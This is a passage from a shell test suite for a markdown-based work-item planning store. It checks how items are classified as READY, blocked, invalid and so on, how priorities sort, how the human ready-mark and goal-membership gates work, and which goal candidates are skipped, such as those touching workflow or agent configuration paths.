hero_ready_items "$TMP/definitely-not-a-store" >/dev/null 2>&1
check "ready: missing store returns non-zero" "1" "$?"

# An empty store is a healthy empty plate, not a failure (zsh aborted here
# with a raw unmatched-glob error and rc=1 before nullglob was set).
mkdir -p "$TMP/empty-store/items"; plan "$TMP/empty-store"
EMPTY="$(hero_ready_items "$TMP/empty-store" 2>/dev/null)"
check "ready: empty store returns success" "0" "$?"
check "ready: empty store prints nothing" "" "$EMPTY"

# ---------- id integrity -----------------------------------------------------
#
# The space-delimited id sets are only sound if no id can contain the
# delimiter. A whitespace id (`id: AH 12`) used to inject two tokens, letting
# a dep on a NONEXISTENT id resolve, and count as done, with no warning:
# the exact silent-READY failure the dangling-dep report exists to prevent.

item 016-wsid.md "WS tok9" "Whitespace id" "done" "[]"
item 017-wsdep.md 17 "Deps on token of whitespace id" "ready" "[tok9]"
OUT6="$(hero_ready_items "$W" 2>/dev/null)"
ERR6="$(hero_ready_items "$W" 2>&1 >/dev/null)"
check "ready: dep on a whitespace-id token stays blocked" "blocked" "$(state_of 017-wsdep.md "$OUT6")"
printf '%s' "$ERR6" | grep -q "whitespace-containing id"
check "ready: whitespace id warns on stderr" "0" "$?"

# Duplicate ids (after normalization, 007 is already item 005's id) must be
# named: dependents may resolve against the wrong twin.
item 018-dup7.md 7 "Duplicate of padded id 007" "accepted" "[]"
ERR7="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR7" | grep -q "duplicate id 7"
check "ready: normalized duplicate id warns on stderr" "0" "$?"

# An item with no usable id cannot participate in dependency order; handing
# it out as READY would have a consumer work an item nothing can depend on.
printf 'just prose, no frontmatter\n' > "$W/items/019-prose.md"
OUT7="$(hero_ready_items "$W" 2>/dev/null)"
check "ready: id-less item is invalid, not READY" "invalid" "$(state_of 019-prose.md "$OUT7")"

# discovered_from is provenance, never a blocker, and schema 1 keeps it as a
# SEPARATE edge from `parent`: a dangling one must not block (or even warn).
cat > "$W/items/020-disc.md" <<'EOF'
---
id: 20
type: task
title: Discovered while working another item
status: ready
depends_on: []
discovered_from: 999
---
EOF
OUT8="$(hero_ready_items "$W" 2>/dev/null)"
check "ready: dangling discovered_from never blocks" "READY" "$(state_of 020-disc.md "$OUT8")"

# ---------- the type gate ----------------------------------------------------
#
# `type` is the discriminator schema 1 dispatches on, so an item without one,
# in a store that IS migrated, must be loud rather than guessed. Guessing
# `task` is how a goal gets handed to wayfare-build-task to build.

printf -- '---\nid: 26\ntitle: No type line\nstatus: ready\ndepends_on: []\n---\n' > "$W/items/026-notype.md"
printf -- '---\nid: 27\ntype: widget\ntitle: Unknown type\nstatus: ready\ndepends_on: []\n---\n' > "$W/items/027-badtype.md"
OUTT="$(hero_ready_items "$W" 2>/dev/null)"
check "type: missing type is invalid, not READY" "invalid" "$(state_of 026-notype.md "$OUTT")"
check "type: unrecognized type is invalid"       "invalid" "$(state_of 027-badtype.md "$OUTT")"
ERRT="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERRT" | grep -q "026-notype.md has no type"
check "type: missing type warns on stderr" "0" "$?"
printf '%s' "$ERRT" | grep -q "unrecognized type 'widget'"
check "type: unrecognized type names the type on stderr" "0" "$?"

# ---------- priority ---------------------------------------------------------
#
# `priority` orders the listing. Absent must sort LAST and an unrecognized value
# must never sort first: a typo that claimed p0 would hand the owner's
# attention to the wrong item with no error.

PR="$TMP/prio"
mkdir -p "$PR/items"
plan "$PR"
pitem() { # file id priority
  printf -- '---\nid: %s\ntype: task\nshape: structural\ntitle: T%s\nstatus: ready\ndepends_on: []\n' "$2" "$2" > "$PR/items/$1"
  [ -z "$3" ] || printf 'priority: %s\n' "$3" >> "$PR/items/$1"
  printf -- '---\n' >> "$PR/items/$1"
}
pitem 001-none.md 1 ""
pitem 002-p2.md 2 p2
pitem 003-p0.md 3 p0
pitem 004-urgent.md 4 urgent
pitem 005-p2b.md 5 p2
pitem 006-p1.md 6 P1
POUT="$(hero_ready_items "$PR" 2>/dev/null | awk '{print $2}' | tr '\n' ' ')"
check "priority: p0, p1, then p2 in id order, then unranked and invalid in id order" \
  "003-p0.md 006-p1.md 002-p2.md 005-p2b.md 001-none.md 004-urgent.md " "$POUT"
PERR="$(hero_ready_items "$PR" 2>&1 >/dev/null)"
printf '%s' "$PERR" | grep -q "004-urgent.md has unrecognized priority 'urgent'"
check "priority: a value outside the enum warns on stderr" "0" "$?"
printf '%s' "$PERR" | grep -q "002-p2.md.*priority"
check "priority: a valid value does not warn" "1" "$?"
check "priority: the listing keeps every row" "6" "$(hero_ready_items "$PR" 2>/dev/null | wc -l | tr -d ' ')"

# ---------- planning gate ----------------------------------------------------
#
# `planning` is the human ready-mark gate: planned items sit there until a
# person flips them to `ready`. Each case pins a way the gate could be
# silently defeated, the precise silent-READY shape this table exists to catch.

item 021-planning.md 21 "Awaiting ready-mark" "planning" "[1]"
item 022-plandep.md 22 "Depends on a planning item" "ready" "[21]"
cat > "$W/items/023-qplan.md" <<'EOF'
---
id: 23
type: task
title: Quoted planning
status: "planning"
depends_on: []
---
EOF
item 024-capplan.md 24 "Capitalized planning" "Planning" "[]"
# `plan` is the display LABEL, `planning` the keyword, an intuitive-but-wrong
# shortening that previously fell through to READY, defeating the whole gate.
item 025-typo.md 25 "Status typo" "plan" "[1]"
OUT9="$(hero_ready_items "$W" 2>/dev/null)"
check "planning: item lists as plan, not READY" "plan"    "$(state_of 021-planning.md "$OUT9")"
check "planning: quoted planning counts"        "plan"    "$(state_of 023-qplan.md "$OUT9")"
check "planning: capitalized planning counts"   "plan"    "$(state_of 024-capplan.md "$OUT9")"
# A dependent of a planning item stays blocked (the id EXISTS, it is just not
# done, so this is ordinary blocking, NOT a dangling-ref).
check "planning: dependent stays blocked"       "blocked" "$(state_of 022-plandep.md "$OUT9")"
printf '%s' "$OUT9" | grep -q '022-plandep.md.*\[missing dep:'
check "planning: dependent is not mislabeled dangling" "1" "$?"
# An UNRECOGNIZED status (the `plan` typo) must be invalid, never READY.
check "planning: unknown status is invalid, not READY" "invalid" "$(state_of 025-typo.md "$OUT9")"
ERR9="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR9" | grep -q "unrecognized status 'plan'"
check "planning: unknown status warns on stderr" "0" "$?"

# ---------- the task lifecycle -----------------------------------------------
#
# new|accepted|planning|ready|active|committed|review|done|dropped. Each case
# pins a way the mapping could silently regress: an `accepted` task handed to
# wayfare-build-task unplanned (backlog must never be READY), or a terminal state
# wrongly satisfying a dependency.

item 030-backlog.md 30 "Unplanned task" "accepted" "[]"
item 032-fready.md 32 "Planned and marked ready" "ready" "[1]"
item 033-fblocked.md 33 "Ready but blocked" "ready" "[30]"
item 034-fimpl.md 34 "Being built" "active" "[]"
item 036-frev.md 36 "PR in review" "review" "[]"
item 037-fdone.md 37 "Shipped task" "done" "[]"
item 038-fcaps.md 38 "Capitalized type" "accepted" "[]" "Task"
item 039-ftypo.md 39 "Task status typo" "in-review" "[]"
item 041-fchain.md 41 "Depends on shipped task" "ready" "[37]"
printf -- '---\nid: 43\ntype: task\ntitle: No status line\ndepends_on: []\n---\n' > "$W/items/043-fnostatus.md"
item 044-fcaps.md 44 "Capitalized ready" "Ready" "[]"
# A colon smuggled into status must NOT suffix-match a type-keyed arm:
# `x:ready` reaching READY skips the ready-mark; `not:done` reaching `done` is
# a split-brain (listed done, but done_ids uses exact compare, so dependents
# block forever).
item 045-colon.md 45 "Colon status" "x:ready" "[]"
item 047-notdone.md 47 "Colon done status" "not:done" "[]"
# Backlog rows still run the dep check: unmet deps annotate the row
# (wayfare's report prints it) and a dangling ref warns; a bootstrap typo must
# not be invisible.
item 049-fwait.md 49 "Backlog waiting on dep" "accepted" "[30]"
item 050-fdangle.md 50 "Backlog dangling dep" "accepted" "[999]"
# `committed` is a goal task's commit on the goal branch, unmerged: its own
# row, never READY, never a satisfied dependency (the default branch lacks the
# code), and the dependent's row must NAME it so a goal turn can tell a
# dependency already on its own branch from a real block.
item 195-fcommit.md 195 "Committed on goal branch" "committed" "[]"
item 196-fafter.md 196 "Ready, waiting on committed" "ready" "[195]"
item 197-fafterlog.md 197 "Backlog, waiting on committed" "accepted" "[195]"
# `dropped` is terminal and must NOT satisfy a dependency: the prerequisite
# was abandoned, so anything waiting on it really is blocked. Listing it as
# `done` would re-plan around code nobody ever wrote.
item 199-dropped.md 199 "Abandoned task" "dropped" "[]"
item 200-waitdrop.md 200 "Waiting on abandoned work" "ready" "[199]"
OUTF="$(hero_ready_items "$W" 2>/dev/null)"
check "task: accepted lists as backlog, not READY" "backlog" "$(state_of 030-backlog.md "$OUTF")"
check "task: ready with deps done is READY"    "READY"   "$(state_of 032-fready.md "$OUTF")"
check "task: ready with unmet dep is blocked"  "blocked" "$(state_of 033-fblocked.md "$OUTF")"
check "task: active is active"                 "active"  "$(state_of 034-fimpl.md "$OUTF")"
check "task: review lists as review"           "review"  "$(state_of 036-frev.md "$OUTF")"
check "task: done is done"                     "done"    "$(state_of 037-fdone.md "$OUTF")"
check "task: type match is case-insensitive"   "backlog" "$(state_of 038-fcaps.md "$OUTF")"
check "task: unknown status is invalid"        "invalid" "$(state_of 039-ftypo.md "$OUTF")"
# A done task must count in done_ids, or every roadmap chain stalls forever.
check "task: dep on a done task is READY"      "READY"   "$(state_of 041-fchain.md "$OUTF")"
# No status line means the item was just created and nobody has triaged it:
# `new`, never READY.
check "task: empty status defaults to new"     "new"     "$(state_of 043-fnostatus.md "$OUTF")"
check "task: capitalized ready is READY"       "READY"   "$(state_of 044-fcaps.md "$OUTF")"
check "task: colon status is invalid"          "invalid" "$(state_of 045-colon.md "$OUTF")"
check "task: colon-done is invalid, not done"  "invalid" "$(state_of 047-notdone.md "$OUTF")"
check "task: backlog with unmet dep stays backlog" "backlog" "$(state_of 049-fwait.md "$OUTF")"
printf '%s' "$OUTF" | grep -q '049-fwait.md.*\[deps unmet'
check "task: backlog unmet deps are annotated" "0" "$?"
printf '%s' "$OUTF" | grep -q '050-fdangle.md.*missing dep: 999'
check "task: backlog dangling dep is annotated" "0" "$?"
check "task: committed lists as committed"     "committed" "$(state_of 195-fcommit.md "$OUTF")"
check "task: dep on committed is blocked, not READY" "blocked" "$(state_of 196-fafter.md "$OUTF")"
printf '%s' "$OUTF" | grep -q '196-fafter.md.*\[committed dep: 195\]'
check "task: blocked row names its committed dep" "0" "$?"
printf '%s' "$OUTF" | grep -q '197-fafterlog.md.*\[deps unmet; committed dep: 195\]'
check "task: backlog row names its committed dep" "0" "$?"
check "task: dropped lists as dropped, not done" "dropped" "$(state_of 199-dropped.md "$OUTF")"
check "task: dep on a dropped item stays blocked" "blocked" "$(state_of 200-waitdrop.md "$OUTF")"
ERRF="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERRF" | grep -q "unrecognized status 'in-review'.*new/accepted/planning/ready"
check "task: unknown status names the task enum on stderr" "0" "$?"
printf '%s' "$ERRF" | grep -q "045-colon.md has a malformed status/type"
check "task: colon status warns on stderr"     "0" "$?"
printf '%s' "$ERRF" | grep -q "050-fdangle.md depends_on '999'"
check "task: backlog dangling dep warns on stderr" "0" "$?"

# ---------- signals and goals ------------------------------------------------
#
# A signal is DELIVERED, never built, so it must never reach READY: handing
# one to wayfare-build-task is always wrong. A goal is a container, so the same holds
# for the opposite reason. `resolution` is what lets both end at `done`
# without the listing knowing either type's vocabulary.

item 054-df.md 54 "Surface divergence" "accepted" "[]" "signal"
item 055-dfq.md 55 "Ready to deliver" "ready" "[]" "signal"
item 056-dfd.md 56 "Filed upstream" "done" "[]" "signal"
item 058-af.md 58 "Boundary divergence" "accepted" "[]" "signal"
# A signal claiming a task-only status must be loud, not quietly active.
item 060-dfbad.md 60 "Signal claiming committed" "committed" "[]" "signal"
# THE case `resolution` exists for: a delivered or rejected signal ends at
# `done` like everything else, so its dependents unblock under the one rule.
# Keying terminality on the word `done` alone used to leave every dependent of
# an answered upstream question blocked forever.
cat > "$W/items/061-rejected.md" <<'EOF'
---
id: 61
type: signal
channel: design
title: Design said no
status: done
resolution: rejected
depends_on: []
---
EOF
item 062-waitrej.md 62 "Waiting on the answer" "ready" "[61]"
# `new` is valid for every type and READY for none.
item 065-newplain.md 65 "Fresh task" "new" "[]"
item 067-newdf.md 67 "Fresh signal" "new" "[]" "signal"
# A dependency that is merely `new` is not done, so dependents stay blocked.
item 068-waitnew.md 68 "Waits on a new item" "ready" "[65]"
item 070-goalnew.md 70 "Fresh goal" "new" "[]" "goal"
item 071-goaltodo.md 71 "Approved goal" "accepted" "[]" "goal"
# The shared-state arms are type-keyed: `planning` is a task's state, and a
# goal or signal claiming it used to ride the `*:` wildcard into a `plan` row.
item 075-goalplan.md 75 "Goal planning" "planning" "[]" "goal"
item 063-sigplan.md 63 "Signal planning" "planning" "[]" "signal"
# A self-dependency blocks forever and looks like ordinary waiting.
item 051-self.md 51 "Depends on itself" "ready" "[51]"
# `done` with no type used to pass the alphabet gate into done_ids while the
# listing printed the item invalid.
printf -- '---\nid: 52\ntitle: Typeless done\nstatus: done\n---\n' > "$W/items/052-notype.md"
item 053-waitnotype.md 53 "Waits on the typeless" "ready" "[52]"
# A signal with a bad channel routes nowhere; both warn, neither invalidates.
printf -- '---\nid: 64\ntype: signal\nchannel: desgn\ntitle: Typo channel\nstatus: accepted\ndepends_on: []\n---\n' > "$W/items/064-badchan.md"
# A resolution on an unfinished item is two fields disagreeing.
printf -- '---\nid: 66\ntype: task\nshape: story\ntitle: Resolved but active\nstatus: active\nresolution: shipped\ndepends_on: []\n---\n' > "$W/items/066-earlyres.md"
item 072-goalrun.md 72 "Goal being run" "active" "[]" "goal"
item 073-goaldone.md 73 "Achieved goal" "done" "[]" "goal"
item 074-goalbad.md 74 "Goal claiming ready" "ready" "[]" "goal"
OUTK="$(hero_ready_items "$W" 2>/dev/null)"
check "goal: new is new"                        "new"      "$(state_of 070-goalnew.md "$OUTK")"
check "goal: accepted is goal, never READY"     "goal"     "$(state_of 071-goaltodo.md "$OUTK")"
check "goal: active is active"                  "active"   "$(state_of 072-goalrun.md "$OUTK")"
check "goal: done is done"                      "done"     "$(state_of 073-goaldone.md "$OUTK")"
check "goal: claiming ready is invalid"         "invalid"  "$(state_of 074-goalbad.md "$OUTK")"
check "status: new on a task"                   "new"      "$(state_of 065-newplain.md "$OUTK")"
check "status: new on a signal"                 "new"      "$(state_of 067-newdf.md "$OUTK")"
check "status: dep on a new item stays blocked" "blocked"  "$(state_of 068-waitnew.md "$OUTK")"
check "signal: accepted is feedback, never READY" "feedback" "$(state_of 054-df.md "$OUTK")"
check "signal: ready is feedback, never READY"  "feedback" "$(state_of 055-dfq.md "$OUTK")"
check "signal: done is done"                    "done"     "$(state_of 056-dfd.md "$OUTK")"
check "signal: a second channel behaves the same" "feedback" "$(state_of 058-af.md "$OUTK")"
check "signal: claiming a task-only status is invalid" "invalid" "$(state_of 060-dfbad.md "$OUTK")"
check "signal: rejected is done (resolution carries the ending)" "done" "$(state_of 061-rejected.md "$OUTK")"
check "signal: dep on a rejected signal is READY" "READY"  "$(state_of 062-waitrej.md "$OUTK")"
ERRK="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERRK" | grep -q "unrecognized status 'ready'.*new/accepted/active/done/dropped"
check "goal: bad status names the goal enum"    "0" "$?"
printf '%s' "$ERRK" | grep -q "060-dfbad.md has unrecognized status 'committed'"
check "signal: bad status names its own enum"   "0" "$?"

# ---------- shape ------------------------------------------------------------
#
# `shape` decides what a DoD asserts and nothing about readiness, so a wrong
# value cannot misroute an item. It can only have the DoD written against the
# wrong test, silently — which is the whole value of the field gone. Warned,
# never invalidated: the row itself is still correct.

mkdir -p "$TMP/shape/.plans/items"; SH="$TMP/shape/.plans"; plan "$SH"
shitem() { # file id type status [shape]
  {
    printf -- '---\nid: %s\ntype: %s\ntitle: item %s\nstatus: %s\ndepends_on: []\n' "$2" "$3" "$2" "$4"
    [ -n "${5:-}" ] && printf 'shape: %s\n' "$5"
    printf -- '---\n'
  } > "$SH/items/$1"
}
shitem 001-ok.md    1 task ready story
shitem 002-docs.md  2 task ready docs
shitem 003-typo.md  3 task ready storey
shitem 004-none.md  4 task ready
shitem 005-goal.md  5 goal accepted
shitem 006-goalsh.md 6 goal accepted story
OUTSH="$(hero_ready_items "$SH" 2>/dev/null)"
ERRSH="$(hero_ready_items "$SH" 2>&1 >/dev/null)"

# `docs` is the sixth shape: prose about code that the code has outgrown.
check "shape: docs is recognized"       "READY" "$(state_of 002-docs.md "$OUTSH")"
# Match on `shape`, not the bare filename: these items also trip the
# goal-membership warning, which is a different finding and expected here.
printf '%s' "$ERRSH" | grep -q "002-docs.md.*shape"
check "shape: docs warns about nothing"  "1" "$?"
# A wrong shape still lists, and still lists as READY: it is a DoD problem,
# not a routing one, and hiding the row would lose the item.
check "shape: a typo still lists READY"  "READY" "$(state_of 003-typo.md "$OUTSH")"
printf '%s' "$ERRSH" | grep -q "unrecognized shape 'storey'"
check "shape: a typo warns on stderr"    "0" "$?"
check "shape: a task with none still lists" "READY" "$(state_of 004-none.md "$OUTSH")"
printf '%s' "$ERRSH" | grep -q "004-none.md is a task with no shape"
check "shape: a missing shape warns"     "0" "$?"
printf '%s' "$ERRSH" | grep -q "001-ok.md.*shape"
check "shape: a valid shape is silent"   "1" "$?"
# shape belongs to tasks; a goal carrying one is a store defect worth saying.
printf '%s' "$ERRSH" | grep -q "005-goal.md.*shape"
check "shape: a goal without one is silent" "1" "$?"
printf '%s' "$ERRSH" | grep -q "006-goalsh.md is a goal and carries shape"
check "shape: a goal carrying one warns" "0" "$?"

# ---------- ideas: the parking lot -------------------------------------------
#
# An idea is not work. The two rules that keep it out of the roadmap are the
# ones with a silent failure behind them: listed as anything but `idea` it
# mixes into the actionable rows, and depended on it blocks a real item
# forever behind something nobody decided to do.

mkdir -p "$TMP/ideas/.plans/items"; I="$TMP/ideas/.plans"; plan "$I"
iitem() { # file id status [type]
  printf -- '---\nid: %s\ntype: %s\ntitle: idea %s\nstatus: %s\n---\n' \
    "$2" "${4:-idea}" "$2" "$3" > "$I/items/$1"
}
iitem 001-jotted.md   1 new
iitem 002-parked.md   2 accepted
iitem 003-promoted.md 3 "done"
iitem 004-binned.md   4 dropped
iitem 005-bad.md      5 ready
printf -- '---\nid: 6\ntype: task\nshape: story\ntitle: Depends on an idea\nstatus: ready\ndepends_on: [2]\n---\n' > "$I/items/006-dep.md"
printf -- '---\nid: 7\ntype: task\nshape: story\ntitle: Depends on a promoted idea\nstatus: ready\ndepends_on: [3]\n---\n' > "$I/items/007-depdone.md"
OUTI="$(hero_ready_items "$I" 2>/dev/null)"
ERRI="$(hero_ready_items "$I" 2>&1 >/dev/null)"

# `*:new` would otherwise swallow `idea:new` and print a parked thought as an
# untriaged item, which is exactly what the collapse exists to avoid.
check "idea: new lists as idea, not new"      "idea"    "$(state_of 001-jotted.md "$OUTI")"
check "idea: accepted lists as idea"          "idea"    "$(state_of 002-parked.md "$OUTI")"
check "idea: promoted lists as done"          "done"    "$(state_of 003-promoted.md "$OUTI")"
check "idea: dropped lists as dropped"        "dropped" "$(state_of 004-binned.md "$OUTI")"
# An idea has no `ready` state; claiming one must be loud, never READY.
check "idea: claiming ready is invalid"       "invalid" "$(state_of 005-bad.md "$OUTI")"
printf '%s' "$ERRI" | grep -q "unrecognized status 'ready'.*new/accepted/done/dropped"
check "idea: bad status names the idea enum"  "0" "$?"

# The dependency rule. An idea cannot be built, so nothing will ever mark it
# done that way: the block is permanent and reads as ordinary waiting.
check "idea: a dependent of an open idea is blocked" "blocked" "$(state_of 006-dep.md "$OUTI")"
printf '%s' "$ERRI" | grep -q "006-dep.md depends_on '2', which is an idea"
check "idea: the dependency is named on stderr" "0" "$?"
# Still a defect after promotion: the dependent was written against the
# parking-lot entry, not against the work it became.
check "idea: a dependent of a promoted idea is also blocked" "blocked" "$(state_of 007-depdone.md "$OUTI")"
printf '%s' "$ERRI" | grep -q "007-depdone.md depends_on '3', which is an idea"
check "idea: a promoted idea's dependency still warns" "0" "$?"

# ---------- typed arms, self-deps, typeless done, channel, resolution --------

OUTW="$(hero_ready_items "$W" 2>/dev/null)"
ERRW="$(hero_ready_items "$W" 2>&1 >/dev/null)"
check "goal at planning is invalid, not plan"     "invalid" "$(state_of 075-goalplan.md "$OUTW")"
check "signal at planning is invalid, not plan"   "invalid" "$(state_of 063-sigplan.md "$OUTW")"
check "self-dependency lists blocked"             "blocked" "$(state_of 051-self.md "$OUTW")"
printf '%s' "$ERRW" | grep -q "051-self.md depends_on itself"
check "self-dependency is named on stderr"        "0" "$?"
check "typeless done lists invalid"               "invalid" "$(state_of 052-notype.md "$OUTW")"
check "typeless done does not satisfy a dependency" "blocked" "$(state_of 053-waitnotype.md "$OUTW")"
printf '%s' "$ERRW" | grep -q "064-badchan.md has unrecognized channel 'desgn'"
check "bad channel warns"                         "0" "$?"
check "bad channel still lists as feedback"       "feedback" "$(state_of 064-badchan.md "$OUTW")"
printf '%s' "$ERRW" | grep -q "066-earlyres.md carries resolution 'shipped' at status 'active'"
check "resolution before done warns"              "0" "$?"
check "resolution before done still lists active" "active" "$(state_of 066-earlyres.md "$OUTW")"
iitem 008-actidea.md 8 active
OUTI="$(hero_ready_items "$I" 2>/dev/null)"
check "idea at active is invalid, not active"     "invalid" "$(state_of 008-actidea.md "$OUTI")"

# hero_plan_field reads one level into a block with a dotted key; a bare
# block key prints nothing, which is what made every drift scan see no head.
mkdir -p "$TMP/pf/items"
printf -- '---\nschema: 1\nnext_id: 4\nsource:\n  root: .\n  head: abc123\ntarget:\n  project: p1\n---\n' > "$TMP/pf/PLAN.md"
check "plan field: scalar"         "4"      "$(hero_plan_field next_id "$TMP/pf")"
check "plan field: nested head"    "abc123" "$(hero_plan_field source.head "$TMP/pf")"
check "plan field: nested project" "p1"     "$(hero_plan_field target.project "$TMP/pf")"
check "plan field: block key is empty" ""   "$(hero_plan_field source "$TMP/pf")"

# The count the roadmap view collapses to: open ideas only.
check "idea count: open ideas only"  "2" "$(hero_idea_count "$I")"
check "idea count: no store is 0"    "0" "$(hero_idea_count "$TMP/definitely-not-a-store")"

# An idea must never be credited as goal coverage, or a parked thought
# suppresses the uncovered finding for ground nobody has planned.
printf '%s' "$ERRI" | grep -q "001-jotted.md is .* and no open goal"
check "idea: never warned about as an uncovered task" "1" "$?"

# ---------- goal membership (parent, not covers) ------------------------------
#
# `wayfare-start-goal` walks goals, never items, so a planned task outside every
# open goal is never handed out: it sits READY until someone runs
# `wayfare-advance-item N` by hand. Membership is ONE edge in ONE direction now, so two goals claiming one
# task is not representable and needs no defect check.

mkdir -p "$TMP/cov/.plans/items"; C="$TMP/cov/.plans"; plan "$C"
mkitem() { # file id type status [parent] [rank]
  {
    printf -- '---\nid: %s\ntype: %s\ntitle: item %s\nstatus: %s\ndepends_on: []\n' "$2" "$3" "$2" "$4"
    [ "$3" = task ] && printf 'shape: story\n'                  # else the no-shape warning fires
    [ -n "${5:-}" ] && printf 'parent: %s\n' "$5"
    [ -n "${6:-}" ] && printf 'rank: %s\n' "$6"
    printf -- '---\n'
  } > "$C/items/$1"
}
mkitem 001-in.md     1 task ready     10 2
mkitem 002-out.md    2 task ready
mkitem 003-second.md 3 task ready     10 1
mkitem 004-donegoal.md 4 task ready   12
mkitem 005-todo.md   5 task accepted
mkitem 006-impl.md   6 task active
mkitem 007-rev.md    7 task review    13
mkitem 009-commit.md 9 task committed
mkitem 010-goal.md  10 goal accepted
mkitem 012-goal.md  12 goal "done"
mkitem 013-newgoal.md 13 goal "new"

# Members come from `parent`, ordered by `rank`: item 3 ranks 1, item 1 ranks 2.
check "members: derived from parent, ordered by rank" "3
1" "$(hero_goal_members 10 "$C")"
check "members: a goal with none prints nothing" "" "$(hero_goal_members 99 "$C")"
check "members: an empty GOAL_ID is refused, not every orphan" "2" "$(hero_goal_members "" "$C" 2>/dev/null; echo $?)"

ERRC="$(hero_ready_items "$C" 2>&1 >/dev/null)"
printf '%s' "$ERRC" | grep -q "002-out.md is ready and no open goal has it as a member"
check "members: uncovered ready task warns" "0" "$?"
printf '%s' "$ERRC" | grep -q "006-impl.md is active and no open goal"
check "members: uncovered active task warns" "0" "$?"
# Only an OPEN goal counts: a `new` goal is untriaged and a `done` one is
# finished, so neither may silence the warning for its members.
printf '%s' "$ERRC" | grep -q "007-rev.md is review and no open goal"
check "members: a new goal does not count as cover" "0" "$?"
printf '%s' "$ERRC" | grep -q "004-donegoal.md is ready and no open goal"
check "members: a done goal does not count as cover" "0" "$?"
printf '%s' "$ERRC" | grep -q "009-commit.md is committed and no open goal"
check "members: uncovered committed task warns" "0" "$?"
# An `accepted` task is not planned yet, so it is not expected in a goal.
printf '%s' "$ERRC" | grep -q "005-todo.md"
check "members: an accepted task is not warned about" "1" "$?"
# A member of an open goal is silent.
printf '%s' "$ERRC" | grep -q "001-in.md"
check "members: a covered task is not warned about" "1" "$?"
OUTC="$(hero_ready_items "$C" 2>/dev/null)"
check "members: uncovered task still lists READY" "READY" "$(state_of 002-out.md "$OUTC")"
check "members: uncovered active task still lists active" "active" "$(state_of 006-impl.md "$OUTC")"

# ---------- goal candidates: ungrouped work a goal's gate may adopt -----------

mkdir -p "$TMP/cand/.plans/items"; G="$TMP/cand/.plans"; plan "$G"
mkcand() { # file id status [source] [deps] [parent] [extra-line]
  {
    printf -- '---\nid: %s\ntype: task\nshape: story\ntitle: item %s\nstatus: %s\n' "$2" "$2" "$3"
    printf 'depends_on: [%s]\n' "${5:-}"
    [ -n "${4:-}" ] && printf 'source: [%s]\n' "$4"
    [ -n "${6:-}" ] && printf 'parent: %s\n' "$6"
    [ -n "${7:-}" ] && printf '%s\n' "$7"
    printf -- '---\n'
  } > "$G/items/$1"
}
mkgoal() { printf -- '---\nid: %s\ntype: goal\ntitle: g\nstatus: %s\ndepends_on: []\n---\n' "$2" "$3" > "$G/items/$1"; }
mkgoal 050-goal.md    50 accepted
mkgoal 051-other.md   51 accepted
mkgoal 052-old.md     52 "done"
mkgoal 053-running.md 53 active
mkcand 001-member.md    1 ready    src/a     ""   50
mkcand 002-free.md      2 ready    src/x
mkcand 003-inside.md    3 accepted src/a/sub
mkcand 004-other.md     4 ready    src/d     ""   51
mkcand 005-oldgoal.md   5 ready    src/e     ""   52
mkcand 006-nosrc.md     6 ready
mkcand 007-ci.md        7 ready    ".github/workflows/x.yaml"
mkcand 008-bot.md       8 ready    package.json "" "" "bot: dependabot"
mkcand 009-onmember.md  9 accepted src/a/f   1
mkcand 010-onpool.md   10 accepted src/a/g   3
mkcand 011-onopen.md   11 ready    src/h     4
mkcand 012-waiting.md  12 ready    src/i     ""   ""  "awaiting: [m-1]"
mkcand 013-new.md      13 new      src/j
mkcand 014-active.md   14 active   src/k
mkcand 015-second.md   15 ready    "src/ok, .github/workflows/x.yaml"
mkcand 016-outside.md  16 accepted src/zzz
mkcand 017-missing.md  17 ready    src/m     99
mkcand 018-chain.md    18 ready    src/n     17
mkcand 019-chain2.md   19 ready    src/o     18
mkcand 020-cycle.md    20 ready    src/p     21
mkcand 021-cycle.md    21 ready    src/q     20
mkcand 022-dangling.md 22 ready    src/r     ""   77
mkcand 023-running.md  23 ready    src/s     ""   53
mkcand 024-nested.md   24 ready    apps/web/.claude
mkcand 025-onnew.md    25 ready    src/t     13
printf -- '---\ntype: task\nshape: story\ntitle: no id\nstatus: ready\ndepends_on: []\nsource: [src/u]\n---\n' > "$G/items/026-noid.md"

OUTG="$(hero_goal_candidates 50 "$G" 2>/dev/null)"
ERRG="$(hero_goal_candidates 50 "$G" 2>&1 >/dev/null)"
# Silent exclusions ride on this exact match: a member (1), another open goal's
# task (4, and 23 under an active one), and statuses that are not candidates.
check "candidates: ungrouped ready, contained accepted, deps settled" "2 ready
3 accepted
5 ready
9 accepted
10 accepted" "$OUTG"
skipped() { printf '%s' "$ERRG" | grep -q "$1" && echo yes || echo no; }
check "candidates: no source paths is skipped, not assumed safe" "yes" "$(skipped '6 skipped: no source paths')"
check "candidates: a forbidden path is skipped"           "yes" "$(skipped '7 skipped: touches .github/workflows/x.yaml')"
check "candidates: a forbidden SECOND path is skipped"    "yes" "$(skipped '15 skipped: touches .github/workflows/x.yaml')"
check "candidates: a nested bare .claude is skipped"      "yes" "$(skipped '24 skipped: touches apps/web/.claude')"
check "candidates: a bot's PR is skipped"                 "yes" "$(skipped "8 skipped: a bot's PR")"
check "candidates: a suspended task says so"              "yes" "$(skipped '12 skipped: suspended')"
check "candidates: unplanned outside the goal's paths"    "yes" "$(skipped '16 skipped: unplanned, and src/zzz')"
check "candidates: a dep held by another open goal"       "yes" "$(skipped '11 skipped: depends on 4 (not done')"
check "candidates: a dep no item has is named as missing" "yes" "$(skipped '17 skipped: depends on 99 (which no item has)')"
check "candidates: a dropped dep drops its dependent"     "yes" "$(skipped '18 skipped: depends on 17')"
check "candidates: and its dependent's dependent"         "yes" "$(skipped '19 skipped: depends on 18')"
check "candidates: a cycle is dropped whole"              "yes" "$(skipped '20 skipped: in a dependency cycle')"
check "candidates: a dep outside the pool is not credited" "yes" "$(skipped '25 skipped: depends on 13')"
check "candidates: a dangling parent is a store defect"   "yes" "$(skipped '22 skipped: parent 77 is not a goal')"
check "candidates: an item with no id is a store defect"  "yes" "$(skipped '026-noid.md skipped: no id')"
check "candidates: an empty GOAL_ID is refused"   "2" "$(hero_goal_candidates "" "$G" >/dev/null 2>&1; echo $?)"
check "candidates: no such goal is refused"       "2" "$(hero_goal_candidates 999 "$G" >/dev/null 2>&1; echo $?)"
check "candidates: a done goal is refused"        "2" "$(hero_goal_candidates 52 "$G" >/dev/null 2>&1; echo $?)"
